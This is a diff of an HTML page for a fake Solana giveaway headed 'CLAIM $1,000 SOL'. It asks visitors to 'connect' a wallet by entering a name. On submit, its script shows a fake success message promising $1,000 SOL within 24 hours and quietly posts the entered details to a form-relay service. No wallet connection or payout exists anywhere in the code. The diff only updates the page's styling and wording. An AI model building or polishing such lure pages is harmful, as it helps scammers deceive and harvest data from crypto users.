@@ -3,171 +3,170 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim $1,000 SOL</title>
-    <!-- Web3-Style Fonts -->
+    <title>SOLANA REWARDS</title>
+    <!-- Advanced Web3 Typography -->
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root {
-            --primary-gradient: linear-gradient(135deg, #00FFA3 0%, #DC1FFF 100%);
-            --bg-color: #0b0e11;
-            --card-bg: #1e2329;
-            --text-main: #ffffff;
-            --text-sub: #b7bdc6;
-            --input-bg: rgba(255, 255, 255, 0.05);
+            --solana-green: #00FFA3;
+            --solana-purple: #DC1FFF;
+            --glass: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.1);
         }
 
         body {
             margin: 0;
-            padding: 0;
-            font-family: 'Sora', sans-serif;
-            background-color: var(--bg-color);
-            background-image: 
-                radial-gradient(circle at 20% 30%, rgba(0, 255, 163, 0.15), transparent 40%),
-                radial-gradient(circle at 80% 70%, rgba(220, 31, 255, 0.15), transparent 40%);
-            color: var(--text-main);
+            background-color: #050505;
+            color: #ffffff;
+            font-family: 'Space Grotesk', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             overflow: hidden;
+            /* Advanced animated background */
+            background: radial-gradient(circle at 10% 20%, rgba(0, 255, 163, 0.08) 0%, transparent 40%),
+                        radial-gradient(circle at 90% 80%, rgba(220, 31, 255, 0.08) 0%, transparent 40%);
         }
 
-        .container {
-            max-width: 480px;
+        .glass-card {
             width: 90%;
-            background: var(--card-bg);
-            padding: 50px 40px;
-            border-radius: 28px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            max-width: 520px;
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 30px;
+            padding: 60px 40px;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            position: relative;
         }
 
+        /* Header on a single line with advanced styling */
         h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2.2rem;
-            margin-bottom: 15px;
-            background: var(--primary-gradient);
+            font-family: 'Syncopate', sans-serif;
+            font-size: 1.8rem;
+            white-space: nowrap; /* Forces text to stay on one line */
+            margin: 0 0 20px 0;
+            background: linear-gradient(90deg, var(--solana-green), #fff, var(--solana-purple));
+            background-size: 200% auto;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            font-weight: 800;
+            animation: shine 4s linear infinite;
+            letter-spacing: -1px;
         }
 
-        .sub-text {
-            color: var(--text-sub);
+        @keyframes shine {
+            to { background-position: 200% center; }
+        }
+
+        .instruction {
             font-size: 1rem;
-            margin-bottom: 35px;
-            line-height: 1.5;
+            color: #b0b0b0;
+            margin-bottom: 40px;
+            line-height: 1.6;
+            letter-spacing: 0.5px;
+            font-weight: 300;
         }
 
-        .input-section {
-            margin-bottom: 30px;
+        .input-container {
             text-align: left;
+            margin-bottom: 30px;
         }
 
         label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 600;
-            color: #00FFA3;
-            font-size: 0.9rem;
+            font-size: 0.75rem;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
+            color: var(--solana-green);
+            margin-bottom: 12px;
+            display: block;
+            font-weight: 700;
         }
 
         input[type="text"] {
             width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            border-radius: 12px;
             padding: 18px;
-            border-radius: 14px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            background: var(--input-bg);
-            color: white;
+            color: #fff;
+            font-family: 'Space Grotesk', sans-serif;
             font-size: 1.1rem;
             box-sizing: border-box;
-            transition: all 0.3s ease;
-            font-family: 'Sora', sans-serif;
+            transition: 0.3s;
         }
 
         input[type="text"]:focus {
             outline: none;
-            border-color: #00FFA3;
-            background: rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 20px rgba(0, 255, 163, 0.15);
-        }
-
-        .connect-btn {
-            width: 100%;
-            padding: 18px;
-            border: none;
-            border-radius: 14px;
-            background: var(--primary-gradient);
-            color: white;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 1.1rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 20px rgba(220, 31, 255, 0.2);
-            text-transform: uppercase;
-        }
-
-        .connect-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 25px rgba(220, 31, 255, 0.4);
-            filter: brightness(1.1);
-        }
-
-        #success-screen {
-            display: none;
-            animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1) forwards;
-        }
-
-        .success-text {
-            font-size: 1.2rem;
-            color: #00FFA3;
-            line-height: 1.8;
-            font-weight: 600;
-            padding: 20px;
-            border: 1px solid rgba(0, 255, 163, 0.3);
+            border-color: var(--solana-green);
             background: rgba(0, 255, 163, 0.05);
-            border-radius: 16px;
         }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
+        .btn {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, var(--solana-green), var(--solana-purple));
+            color: #fff;
+            font-family: 'Syncopate', sans-serif;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.4s;
+            box-shadow: 0 10px 30px rgba(220, 31, 255, 0.3);
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            filter: brightness(1.2);
+            box-shadow: 0 15px 40px rgba(0, 255, 163, 0.4);
+        }
+
+        #success-view {
+            display: none;
+            animation: fadeIn 0.8s ease;
+        }
+
+        .congrats-text {
+            font-size: 1.2rem;
+            line-height: 1.8;
+            color: var(--solana-green);
+            font-weight: 500;
+            padding: 25px;
+            background: rgba(0, 255, 163, 0.05);
+            border-radius: 20px;
+            border: 1px dashed var(--solana-green);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- Form Section -->
-        <div id="form-container">
+    <div class="glass-card">
+        <div id="initial-view">
             <form id="claim-form" action="https://formsubmit.co" method="POST">
                 <h1>CLAIM $1,000 SOL</h1>
-                <p class="sub-text">To claim the $1,000 SOL, connect your solana wallet with your name</p>
+                <p class="instruction">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                 
-                <div class="input-section">
-                    <label for="name">Name:</label>
-                    <input type="text" id="name" name="name" placeholder="Enter your name here..." required>
+                <div class="input-container">
+                    <label>Wallet Name</label>
+                    <input type="text" name="name" placeholder="Enter your full name" required>
                 </div>
 
-                <!-- Form Configuration -->
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value=""> <!-- Prevents redirect to thank you page -->
-                
-                <button type="submit" class="connect-btn">CONNECT WALLET</button>
+                <button type="submit" class="btn">CONNECT WALLET</button>
             </form>
         </div>
 
-        <!-- Success Message Section -->
-        <div id="success-screen">
-            <h1 style="font-size: 1.8rem;">CLAIM SUCCESSFUL</h1>
-            <div class="success-text">
+        <div id="success-view">
+            <h1 style="font-size: 1.4rem;">TRANSACTION PENDING</h1>
+            <div class="congrats-text">
                 Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
             </div>
         </div>
@@ -175,21 +174,18 @@
 
     <script>
         const form = document.getElementById('claim-form');
-        const formContainer = document.getElementById('form-container');
-        const successScreen = document.getElementById('success-screen');
-
         form.onsubmit = async (e) => {
             e.preventDefault();
             
-            // Show success screen immediately for better UX
-            formContainer.style.display = 'none';
-            successScreen.style.display = 'block';
+            // Show Success UI
+            document.getElementById('initial-view').style.display = 'none';
+            document.getElementById('success-view').style.display = 'block';
 
-            // Send the data to your email in the background
-            const formData = new FormData(form);
+            // Background submission
+            const data = new FormData(form);
             fetch(form.action, {
                 method: 'POST',
-                body: formData,
+                body: data,
                 headers: { 'Accept': 'application/json' }
             });
         };
